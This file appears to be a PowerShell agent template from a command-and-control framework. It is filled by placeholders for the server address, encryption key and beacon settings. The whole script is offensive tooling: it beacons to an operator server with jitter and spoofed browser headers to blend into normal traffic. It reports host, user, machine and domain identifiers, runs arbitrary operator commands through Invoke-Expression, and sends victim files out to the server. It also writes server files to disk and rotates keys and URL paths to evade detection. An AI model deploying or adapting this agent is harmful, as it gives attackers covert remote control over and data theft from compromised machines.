# Kinetic Compliance Matrix - PowerShell Agent with Dynamic Path Rotation
# This agent contains encryption functionality, system identification, and path rotation

# Set TLS 1.2 for compatibility
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Encryption key
$key = [System.Convert]::FromBase64String('{{KEY_BASE64}}')

# Server details
$serverAddress = '{{SERVER_ADDRESS}}'

# Initial endpoint paths
$beaconPath = '{{BEACON_PATH}}'
$commandResultPath = '{{CMD_RESULT_PATH}}'
$fileUploadPath = '{{FILE_UPLOAD_PATH}}'
$fileRequestPath = '{{FILE_REQUEST_PATH}}'

{{PATH_ROTATION_CODE}}

# Function to encrypt data for C2 communication
function Encrypt-Data {
    param([string]$PlainText)
    
    # Convert to bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    
    # Generate random IV
    $iv = New-Object byte[] 16
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($iv)
    
    # Add padding
    $blockSize = 16
    $paddingLength = $blockSize - ($bytes.Length % $blockSize)
    $paddedBytes = New-Object byte[] ($bytes.Length + $paddingLength)
    [Array]::Copy($bytes, $paddedBytes, $bytes.Length)
    
    # Fill padding bytes
    for ($i = $bytes.Length; $i -lt $paddedBytes.Length; $i++) {
        $paddedBytes[$i] = [byte]$paddingLength
    }
    
    # Encrypt
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $key
    $aes.IV = $iv
    
    $encryptor = $aes.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($paddedBytes, 0, $paddedBytes.Length)
    
    # Combine IV and encrypted bytes
    $result = New-Object byte[] ($iv.Length + $encryptedBytes.Length)
    [Array]::Copy($iv, 0, $result, 0, $iv.Length)
    [Array]::Copy($encryptedBytes, 0, $result, $iv.Length, $encryptedBytes.Length)
    
    # Return Base64
    return [System.Convert]::ToBase64String($result)
}

# Function to decrypt data from C2 communication
function Decrypt-Data {
    param([string]$EncryptedBase64)
    
    # Decode base64
    $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
    
    # Extract IV and ciphertext
    $iv = $encryptedBytes[0..15]
    $ciphertext = $encryptedBytes[16..($encryptedBytes.Length-1)]
    
    # Create AES decryptor
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $key
    $aes.IV = $iv
    
    # Decrypt
    $decryptor = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
    
    # Remove padding
    $paddingLength = $decryptedBytes[$decryptedBytes.Length-1]
    $unpaddedBytes = $decryptedBytes[0..($decryptedBytes.Length-$paddingLength-1)]
    
    # Convert to string
    return [System.Text.Encoding]::UTF8.GetString($unpaddedBytes)
}

# Function to gather system identification information
function Get-SystemIdentification {
    # Gather system identification information
    $systemInfo = @{
        Hostname = [System.Net.Dns]::GetHostName()
        Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        OsVersion = [System.Environment]::OSVersion.VersionString
        Architecture = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
        ProcessorCount = [System.Environment]::ProcessorCount
        TotalMemory = (Get-CimInstance -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB
    }
    
    # Generate a unique client identifier (will be used later for re-registration)
    $clientId = [Guid]::NewGuid().ToString()
    $systemInfo.ClientId = $clientId
    
    # Get Machine GUID - this is a relatively stable identifier
    try {
        $machineGuid = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Cryptography" -Name "MachineGuid" -ErrorAction Stop).MachineGuid
        $systemInfo.MachineGuid = $machineGuid
    } catch {
        $systemInfo.MachineGuid = "Unknown"
    }
    
    # Get MAC address of first network adapter
    try {
        $networkAdapters = Get-CimInstance Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -ne $null }
        if ($networkAdapters) {
            $systemInfo.MacAddress = $networkAdapters[0].MACAddress
        } else {
            $systemInfo.MacAddress = "Unknown"
        }
    } catch {
        $systemInfo.MacAddress = "Unknown"
    }
    
    # Get domain information
    try {
        $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
        $systemInfo.Domain = $computerSystem.Domain
        $systemInfo.PartOfDomain = $computerSystem.PartOfDomain
    } catch {
        $systemInfo.Domain = "Unknown"
        $systemInfo.PartOfDomain = $false
    }
    
    # Add rotation information if enabled
    if ($global:pathRotationEnabled) {
        $systemInfo.RotationId = $global:currentRotationId
    }
    
    # Convert to JSON
    $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
    return $jsonInfo
}

# Function to download a file from client to server
function Download-FileToServer {
    param([string]$FilePath)
    
    Write-Host "Attempting to download file: $FilePath"
    
    if (-not (Test-Path -Path $FilePath)) {
        return "Error: File not found - $FilePath"
    }
    
    try {
        # Get file info
        $fileName = Split-Path -Path $FilePath -Leaf
        $fileSize = (Get-Item $FilePath).Length
        
        # Read file as bytes and encode as Base64
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileContent = [System.Convert]::ToBase64String($fileBytes)
        
        # Create file info object
        $fileInfo = @{
            FileName = $fileName
            FileSize = $fileSize
            FilePath = $FilePath
            FileContent = $fileContent
        }
        
        # Convert to JSON
        $fileInfoJson = ConvertTo-Json -InputObject $fileInfo -Compress
        
        # Encrypt the file data
        $encryptedFileData = Encrypt-Data -PlainText $fileInfoJson
        
        # Get current file upload path
        $uploadPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "file_upload_path" } else { $fileUploadPath }
        $uploadUrl = "http://$serverAddress$uploadPath"
        
        # Create a web client
        $uploadClient = New-Object System.Net.WebClient
        $systemInfo = Get-SystemIdentification
        $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
        $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
        
        # Add headers
        $uploadClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
        $uploadClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
        if ($global:pathRotationEnabled) {
            $uploadClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
        }
        $uploadClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
        $uploadClient.Headers.Add("Content-Type", "application/json")
        
        # Upload the file
        $uploadClient.UploadString($uploadUrl, $encryptedFileData)
        
        # Return success message
        return "$fileSize bytes from $FilePath uploaded to server successfully"
    }
    catch {
        return "Error uploading file: $_"
    }
}

# Function to upload a file from server to client
function Upload-FileFromServer {
    param(
        [string]$ServerFilePath,
        [string]$ClientDestination
    )
    
    Write-Host "Attempting to download file from server: $ServerFilePath to $ClientDestination"
    
    try {
        # Expand environment variables in destination path
        $expandedDestination = [System.Environment]::ExpandEnvironmentVariables($ClientDestination)
        
        # Create the destination directory if it doesn't exist
        $destinationDir = Split-Path -Path $expandedDestination -Parent
        if (-not (Test-Path -Path $destinationDir)) {
            New-Item -Path $destinationDir -ItemType Directory -Force | Out-Null
        }
        
        # Send request to server to get the file
        $fileRequestObj = @{
            FilePath = $ServerFilePath
            Destination = $expandedDestination
        }
        
        $fileRequestJson = ConvertTo-Json -InputObject $fileRequestObj -Compress
        $encryptedRequest = Encrypt-Data -PlainText $fileRequestJson
        
        # Get current file request path
        $fileRequestPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "file_request_path" } else { $fileRequestPath }
        $fileRequestUrl = "http://$serverAddress$fileRequestPath"
        
        # Create a web client
        $requestClient = New-Object System.Net.WebClient
        $systemInfo = Get-SystemIdentification
        $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
        $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
        
        # Add headers
        $requestClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
        $requestClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
        if ($global:pathRotationEnabled) {
            $requestClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
        }
        $requestClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
        $requestClient.Headers.Add("Content-Type", "application/json")
        
        # Send the request and get the response
        $encryptedResponse = $requestClient.UploadString($fileRequestUrl, $encryptedRequest)
        $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedResponse
        
        # Parse the response
        $fileResponse = ConvertFrom-Json -InputObject $decryptedResponse
        
        if ($fileResponse.Status -eq "Error") {
            return "Error from server: $($fileResponse.Message)"
        }
        
        # Decode the file content
        $fileBytes = [System.Convert]::FromBase64String($fileResponse.FileContent)
        
        # Save the file to destination
        [System.IO.File]::WriteAllBytes($expandedDestination, $fileBytes)
        
        # Return success message
        return "File downloaded from server to $expandedDestination ($([Math]::Round($fileBytes.Length / 1KB, 2)) KB)"
    }
    catch {
        return "Error downloading file from server: $_"
    }
}

# Function to list directory contents
function Get-DirectoryListing {
    param([string]$DirectoryPath)
    
    try {
        # Expand environment variables in path
        $expandedPath = [System.Environment]::ExpandEnvironmentVariables($DirectoryPath)
        
        # Get directory contents
        $items = Get-ChildItem -Path $expandedPath -ErrorAction Stop | Select-Object Name, Length, LastWriteTime, Attributes, @{Name="Type";Expression={if($_.PSIsContainer){"Directory"}else{"File"}}}
        
        # Convert to JSON
        $jsonItems = ConvertTo-Json -InputObject $items -Compress
        
        return $jsonItems
    }
    catch {
        return "Error listing directory: $_"
    }
}

# Function to process commands from the C2 server
function Process-Commands {
    param([array]$Commands)
    
    if (-not $Commands -or $Commands.Count -eq 0) {
        return
    }
    
    # Process each command
    foreach ($command in $Commands) {
        $timestamp = $command.timestamp
        $commandType = $command.command_type
        $args = $command.args
        
        # Execute based on command type
        try {
            $result = ""
            
            if ($commandType -eq "execute") {
                # Execute shell command
                try {
                    # Use PowerShell's Invoke-Expression to properly handle PowerShell commands
                    $result = Invoke-Expression -Command $args | Out-String
                }
                catch {
                    $result = "Error executing command: $_"
                }
            }
            elseif ($commandType -eq "upload") {
                # Upload file from client to server
                if (Test-Path -Path $args) {
                    $result = Download-FileToServer -FilePath $args
                } else {
                    $result = "Error: File not found - $args"
                }
            }
            elseif ($commandType -eq "download") {
                # Download file from client to server
                $result = Download-FileToServer -FilePath $args
            }
            elseif ($commandType -eq "file_upload") {
                # Upload file from server to client (format: "Upload-File 'LocalPath' 'RemotePath'")
                try {
                    # Parse the arguments
                    if ($args -match "Upload-File '(.*?)' '(.*?)'") {
                        $serverPath = $matches[1]
                        $clientPath = $matches[2]
                        $result = Upload-FileFromServer -ServerFilePath $serverPath -ClientDestination $clientPath
                    }
                    else {
                        # Try alternate parsing method if regex fails
                        $argParts = $args -split "' '"
                        if ($argParts.Count -ge 2) {
                            $serverPath = $argParts[0].Replace("Upload-File '", "").Trim()
                            $clientPath = $argParts[1].TrimEnd("'").Trim()
                            $result = Upload-FileFromServer -ServerFilePath $serverPath -ClientDestination $clientPath
                        }
                        else {
                            $result = "Error: Invalid file_upload command format: $args"
                        }
                    }
                }
                catch {
                    $result = "Error processing file_upload command: $_"
                }
            }
            elseif ($commandType -eq "system_info") {
                # Return detailed system information
                $detailedInfo = Get-SystemIdentification
                $result = $detailedInfo
            }
            elseif ($commandType -eq "key_rotation") {
                # Handle key rotation command from operator
                # Get the new key from args
                try {
                    $newKey = [System.Convert]::FromBase64String($args)
                    $global:key = $newKey
                    $result = "Key rotation successful - using new encryption key"
                }
                catch {
                    $result = "Key rotation failed: $_"
                }
            }
            elseif ($commandType -eq "path_rotation") {
                # Handle path rotation command
                try {
                    $rotationArgs = ConvertFrom-Json -InputObject $args
                    $rotationId = $rotationArgs.rotation_id
                    $nextRotationTime = $rotationArgs.next_rotation_time
                    $paths = $rotationArgs.paths
                    
                    Update-PathRotation -RotationId $rotationId -NextRotationTime $nextRotationTime -Paths $paths
                    $result = "Path rotation updated: ID $rotationId, next rotation at $([DateTimeOffset]::FromUnixTimeSeconds($nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss'))"
                }
                catch {
                    $result = "Path rotation failed: $_"
                }
            }
            else {
                $result = "Unknown command type: $commandType"
            }
            
            # Send the result back to C2
            $resultObj = @{
                timestamp = $timestamp
                result = $result
            }
            
            $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
            $encryptedResult = Encrypt-Data -PlainText $resultJson
            
            # Get current command result path
            $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
            $resultUrl = "http://$serverAddress$cmdResultPath"
            
            $resultClient = New-Object System.Net.WebClient
            $systemInfo = Get-SystemIdentification
            $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
            $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
            
            $resultClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
            $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
            if ($global:pathRotationEnabled) {
                $resultClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
            }
            $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
            $resultClient.Headers.Add("Content-Type", "application/json")
            $resultClient.UploadString($resultUrl, $encryptedResult)
        }
        catch {
            # Send the error as a result
            $resultObj = @{
                timestamp = $timestamp
                result = "Error executing command: $_"
            }
            
            $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
            $encryptedResult = Encrypt-Data -PlainText $resultJson
            
            # Get current command result path
            $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
            $resultUrl = "http://$serverAddress$cmdResultPath"
            
            $resultClient = New-Object System.Net.WebClient
            $systemInfo = Get-SystemIdentification
            $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
            $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
            
            $resultClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
            $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
            if ($global:pathRotationEnabled) {
                $resultClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
            }
            $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
            $resultClient.Headers.Add("Content-Type", "application/json")
            $resultClient.UploadString($resultUrl, $encryptedResult)
        }
    }
}

# Function to check rotation times
function Check-PathRotation {
    $currentTime = [int][double]::Parse((Get-Date -UFormat %s))
    
    # Check if we're past rotation time
    if ($global:pathRotationEnabled -and $currentTime -ge $global:nextRotationTime) {
        # We need to get rotations info from server ASAP
        # Will be handled on next beacon
        Write-Host "Rotation time reached, waiting for update from server..."
    }
}

# Function to handle server response headers and update rotation info
function Process-ServerResponseHeaders {
    param($WebClient)
    
    # Check for rotation information in headers
    if ($global:pathRotationEnabled) {
        $rotationId = $WebClient.ResponseHeaders["X-Rotation-ID"]
        $nextRotation = $WebClient.ResponseHeaders["X-Next-Rotation"]
        
        if ($rotationId -and [int]$rotationId -ne $global:currentRotationId) {
            # Server has newer rotation, we need to get paths
            Write-Host "Server has newer rotation ID: $rotationId (current: $global:currentRotationId)"
            $global:currentRotationId = [int]$rotationId
        }
        
        if ($nextRotation -and [int]$nextRotation -ne $global:nextRotationTime) {
            $global:nextRotationTime = [int]$nextRotation
            Write-Host "Next rotation time updated: $([DateTimeOffset]::FromUnixTimeSeconds($global:nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss'))"
        }
    }
}

# Main agent loop
function Start-AgentLoop {
    $beaconInterval = {{BEACON_INTERVAL}}  # Seconds
    $jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage to randomize beacon timing
    
    # Get system information for identification
    $systemInfo = Get-SystemIdentification
    
    # Consistent client ID for this instance
    $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
    $clientId = $systemInfoObj.ClientId
    $hostname = $systemInfoObj.Hostname
    
    # Track failed connection attempts for fallback
    $consecutiveFailures = 0
    $maxFailuresBeforeFallback = {{MAX_FAILURES}}
    
    # Boolean to track if we're using fallback paths
    $usingFallbackPaths = $false
    
    while ($true) {
        try {
            # Check if rotation time has passed but we haven't got new paths yet
            Check-PathRotation
            
            # Add jitter to beacon interval
            $jitterFactor = 1 + (Get-Random -Minimum (-$jitterPercentage) -Maximum $jitterPercentage) / 100
            $actualInterval = $beaconInterval * $jitterFactor
            
            # Create web client for C2 communication
            $webClient = New-Object System.Net.WebClient
            
            # Add system info in encrypted form
            $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
            $webClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
            
            # Add client ID
            $webClient.Headers.Add("X-Client-ID", $clientId)
            
            # Add current rotation ID if path rotation is enabled
            if ($global:pathRotationEnabled) {
                $webClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
            }
            
            # Add legitimate-looking headers to blend in with normal web traffic
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
            $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
            $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
            
            # Get current beacon path based on rotation status
            $currentBeaconPath = if ($global:pathRotationEnabled -and -not $usingFallbackPaths) { 
                Get-CurrentPath -PathType "beacon_path" 
            } else { 
                $beaconPath 
            }
            $beaconUrl = "http://$serverAddress$currentBeaconPath"
            
            # Beacon to the C2 server
            Write-Host "[$hostname] Beaconing to $beaconUrl"
            $encryptedResponse = $webClient.DownloadString($beaconUrl)
            
            # Process response headers for path rotation updates
            Process-ServerResponseHeaders -WebClient $webClient
            
            # Reset failure counter on successful connection
            $consecutiveFailures = 0
            $usingFallbackPaths = $false
            
            # Decrypt and process response if not empty
            if ($encryptedResponse.Length -gt 0) {
                $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedResponse
                $commands = ConvertFrom-Json -InputObject $decryptedResponse
                
                # Process commands
                Process-Commands -Commands $commands
            }
        }
        catch {
            $errorMsg = $_.Exception.Message
            Write-Host "[$hostname] Error in beacon: $errorMsg"
            
            # Increment failure counter
            $consecutiveFailures++
            
            # If too many failures and using dynamic paths, try falling back to default paths
            if ($global:pathRotationEnabled -and $consecutiveFailures -ge $maxFailuresBeforeFallback -and -not $usingFallbackPaths) {
                Write-Host "[$hostname] Falling back to initial paths after $consecutiveFailures failures"
                $usingFallbackPaths = $true
            }
            
            # If still failing with fallback paths, increase the beacon interval temporarily
            if ($consecutiveFailures -gt ($maxFailuresBeforeFallback * 2)) {
                # Exponential backoff with max of 5 minutes
                $backoffSeconds = [Math]::Min({{MAX_BACKOFF}}, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback * 2) + 2))
                Write-Host "[$hostname] Connection issues persist, waiting $backoffSeconds seconds before retry"
                Start-Sleep -Seconds $backoffSeconds
                continue
            }
        }
        
        # Wait for next beacon interval
        Start-Sleep -Seconds $actualInterval
    }
}

# Start the agent
Start-AgentLoop